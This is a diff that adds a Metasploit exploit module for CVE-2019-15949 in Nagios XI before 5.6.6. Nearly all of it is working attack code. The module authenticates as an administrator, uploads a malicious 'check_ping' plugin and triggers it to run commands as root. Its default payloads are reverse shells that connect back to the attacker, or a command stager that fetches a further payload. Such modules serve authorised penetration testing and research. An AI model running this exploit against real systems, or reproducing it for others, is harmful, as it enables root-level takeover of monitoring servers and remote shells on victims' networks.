@@ -1,0 +1,294 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Nagios XI Authenticated Remote Command Execution',
+      'Description'     => %q{
+        This module exploits a vulnerability in Nagios XI before 5.6.6 in
+        order to execute arbitrary commands as root.
+
+        The module uploads a malicious plugin to the Nagios XI server and then
+        executes this plugin by issuing an HTTP GET request to download a
+        system profile from the server. For all supported targets except Linux
+        (cmd), the module uses a command stager to write the exploit to the
+        target via the malicious plugin. This may not work if Nagios XI is
+        running in a restricted Unix environment, so in that case the target
+        must be set to Linux (cmd). The module then writes the payload to the
+        malicious plugin while avoiding commands that may not be supported.
+
+        Valid credentials for a user with administrative privileges are
+        required. This module was successfully tested on Nagios XI 5.6.5
+        running on CentOS 7. The module may behave differently against older
+        versions of Nagios XI. See the documentation for more information.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Jak Gibb',       # https://github.com/jakgibb/ - Discovery and exploit
+          'Erik Wynter'     # @wyntererik - Metasploit
+        ],
+      'References'      =>
+        [
+          ['CVE', '2019-15949'],
+          ['URL', 'https://github.com/jakgibb/nagiosxi-root-rce-exploit'] #original PHP exploit
+        ],
+      'Payload'        => { 'BadChars' => "\x00" },
+      'Targets'        =>
+        [
+          [ 'Linux (x86)', {
+            'Arch' => ARCH_X86,
+            'Platform' => 'linux',
+            'DefaultOptions' => {
+              'PAYLOAD'     => 'linux/x86/meterpreter/reverse_tcp'
+            }
+          } ],
+          [ 'Linux (x64)', {
+            'Arch' => ARCH_X64,
+            'Platform' => 'linux',
+            'DefaultOptions' => {
+              'PAYLOAD'     => 'linux/x64/meterpreter/reverse_tcp'
+            }
+          } ],
+          [ 'Linux (cmd)', {
+            'Arch' => ARCH_CMD,
+            'Platform' => 'unix',
+            'DefaultOptions' => {
+              'PAYLOAD'     => 'cmd/unix/reverse_bash'
+            },
+            'Payload' => {
+              'Append' => ' & disown',  # the payload must be disowned after execution, otherwise cleanup fails
+              'BadChars' => "\""
+            }
+          } ]
+        ],
+      'Privileged'      => true,
+      'DisclosureDate'  => 'Jul 29 2019',
+      'DefaultOptions'  => {
+        'RPORT' => 80,
+        'HttpClientTimeout' => 2, #This is needed to close the connection to the server following the system profile download request.
+        'WfsDelay'          => 10
+        },
+      'DefaultTarget'   => 1))
+    register_options [
+      OptString.new('TARGETURI', [true, 'Base path to NagiosXI', '/']),
+      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
+      OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])
+    ]
+
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false])
+    ]
+    import_target_defaults
+  end
+
+  def check
+    vprint_status("Running check")
+
+    #visit Nagios XI login page to obtain the nsp value required for authentication
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, '/nagiosxi/login.php')
+
+    unless res
+      return CheckCode::Unknown('Connection failed')
+    end
+
+    unless res.code == 200 && res.body.include?('Nagios XI')
+      return CheckCode::Safe('Target is not a Nagios XI application.')
+    end
+
+    @nsp = res.body.scan(/nsp_str = "([a-z0-9]+)/).flatten.first rescue ''
+
+    if @nsp.to_s.eql? ''
+      return CheckCode::NoAccess, 'Could not retrieve nsp value, making authentication impossible.'
+    end
+
+    #Attempt to authenticate
+    @username = datastore['USERNAME']
+    password = datastore['PASSWORD']
+    cookie = res.get_cookies.delete_suffix(';') #remove trailing semi-colon
+
+    auth_res = send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/login.php'),
+      'method'       => 'POST',
+      'cookie'       => cookie,
+      'vars_post'    => {
+        nsp: @nsp,
+        page:  'auth',
+        debug: '',
+        pageopt: 'login',
+        username: @username,
+        password: password,
+        loginButton: ''
+      }
+    })
+
+    unless auth_res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless auth_res.code == 302 && auth_res.headers['Location'] == "index.php"
+      fail_with Failure::NoAccess, 'Authentication failed. Please provide a valid username and password.'
+    end
+
+    #Check Nagios XI version - this requires a separate request because following the redirect doesn't work
+    @cookie = auth_res.get_cookies.delete_suffix(';') #remove trailing semi-colon
+    @cookie = @cookie.split().last #app returns 3 cookies, we need only the last one
+    version_check = send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/index.php'),
+      'method'       => 'GET',
+      'cookie'       => @cookie,
+      'nsp'          => @nsp
+    })
+
+    unless version_check
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless version_check.code == 200 && version_check.body.include?('Home Dashboard')
+      fail_with Failure::NoAccess, 'Authentication failed. Please provide a valid username and password.'
+    end
+
+    @version = version_check.body.scan(/product=nagiosxi&version=(\d+\.\d+\.\d+)/).flatten.first rescue ''
+    if @version.to_s.eql? ''
+      return CheckCode::Detected('Could not determine Nagios XI version.')
+    end
+
+    @version = Gem::Version.new @version
+
+    unless @version <= Gem::Version.new('5.6.5')
+      return CheckCode::Safe("Target is Nagios XI with version #{@version}.")
+    end
+
+    CheckCode::Appears("Target is Nagios XI with version #{@version}.")
+  end
+
+  def check_plugin_permissions
+    res = send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/admin/monitoringplugins.php'),
+      'method'       => 'GET',
+      'cookie'       => @cookie,
+      'nsp'          => @nsp
+    })
+
+    unless res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless res.code == 200 && res.body.include?('Manage Plugins')
+      fail_with(Failure::NoAccess, "The user #{@username} does not have permission to edit plugins, which is required for the exploit to work.")
+    end
+
+    @plugin_nsp = res.body.scan(/nsp_str = "([a-z0-9]+)/).flatten.first rescue ''
+    if @plugin_nsp.to_s.eql? ''
+      fail_with Failure::NoAccess, 'Failed to obtain the nsp value required for the exploit to work.'
+    end
+
+    @plugin_cookie = res.get_cookies.delete_suffix(';') #remove trailing semi-colon
+  end
+
+  def execute_command(cmd, opts = {})
+    print_status("Uploading malicious 'check_ping' plugin...")
+    boundary = rand_text_numeric(14)
+    post_data = "-----------------------------#{boundary}\n"
+    post_data << "Content-Disposition: form-data; name=\"upload\"\n\n1\n"
+    post_data << "-----------------------------#{boundary}\n"
+    post_data << "Content-Disposition: form-data; name=\"nsp\"\n\n"
+    post_data << "#{@plugin_nsp}\n"
+    post_data << "-----------------------------#{boundary}\n"
+    post_data << "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n20000000\n"
+    post_data << "-----------------------------#{boundary}\n"
+    post_data << "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"check_ping\"\n" #the exploit doesn't work with a random filename
+    post_data << "Content-Type: text/plain\n\n"
+    post_data << "#{cmd}\n"
+    post_data << "-----------------------------#{boundary}--\n"
+
+    res = send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/admin/monitoringplugins.php'),
+      'method'       => 'POST',
+      'ctype'        => "multipart/form-data; boundary=---------------------------#{boundary}", #this needs to be specified here, otherwise the default value is sent in the header
+      'cookie'       => @plugin_cookie,
+      'data'         => post_data
+    })
+
+    unless res
+      fail_with Failure::Unreachable, 'Upload failed'
+    end
+
+    unless res.code == 200 && res.body.include?('New plugin was installed successfully')
+      fail_with Failure::Unknown, 'Failed to upload plugin.'
+    end
+
+    @plugin_installed = true
+  end
+
+  def execute_payload #This request will timeout. It has to, for the exploit to work.
+    print_status("Executing plugin...")
+    res = send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/includes/components/profile/profile.php'),
+      'method'       => 'GET',
+      'cookie'       => @cookie,
+      'vars_get' => { cmd: 'download' }
+    })
+  end
+
+  def cleanup()
+    return unless @plugin_installed
+
+    print_status("Deleting malicious 'check_ping' plugin...")
+    res = send_request_cgi({
+      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/admin/monitoringplugins.php'),
+      'method'       => 'GET',
+      'cookie'       => @plugin_cookie,
+      'vars_get' => {
+        delete: 'check_ping',
+        nsp: @plugin_nsp
+      }
+    })
+
+    unless res
+      print_warning("Failed to delete the malicious 'check_ping' plugin: Connection failed. Manual cleanup is required.")
+      return
+    end
+
+    unless res.code == 200 && res.body.include?('Plugin deleted')
+      print_warning("Failed to delete the malicious 'check_ping' plugin. Manual cleanup is required.")
+      return
+    end
+
+    print_good("Plugin deleted.")
+  end
+
+  def exploit
+    unless [CheckCode::Detected, CheckCode::Appears].include? check
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if @version
+      print_status("Found Nagios XI application with version #{@version}.")
+    end
+
+    check_plugin_permissions
+    vprint_status("User #{@username} has the required permissions on the target.")
+
+    if target.arch.first == ARCH_CMD
+      execute_command(payload.encoded)
+      message = "Waiting for the payload to connect back..."
+    else
+      execute_cmdstager(background: true)
+      message = "Waiting for the plugin to request the final payload..."
+    end
+    print_good("Successfully uploaded plugin.")
+    execute_payload
+    print_status "#{message}"
+  end
+end
